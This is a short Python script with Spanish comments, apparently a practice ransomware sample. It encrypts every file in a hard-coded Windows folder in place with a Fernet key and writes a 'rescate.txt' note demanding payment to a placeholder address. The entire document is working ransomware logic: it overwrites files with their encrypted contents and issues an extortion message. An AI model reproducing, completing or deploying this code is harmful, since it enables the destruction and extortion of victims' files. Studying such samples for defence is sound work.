from cryptography.fernet import Fernet #libreria para realizar la encriptacion, importacion
import os

def generate_key():#funcion para que el programa genere la clave de encriptacion, se usara esta clave para cifrar los archivos
    key = Fernet.generate_key()#tambien se usa para desencriptar
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load_key():#funcion que nos permite cargar el documento
    return open('key.key','rb').read()

def encrypt(items,key):#funcion con la que se encrypta los documentos
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\espar\\Escritorio\\prueba' #ruta de encryptacion 
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+ item for item in items]

    generate_key()
    key = load_key()
    encrypt(full_path,key)

    with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:# se genera el documento de txt para el rescate, con isntrucciones
        file.write('Ficheros encriptados\n')
        file.write('realizar pago a la siguiente direccion: hsbucbsubcuebucsbubuencu')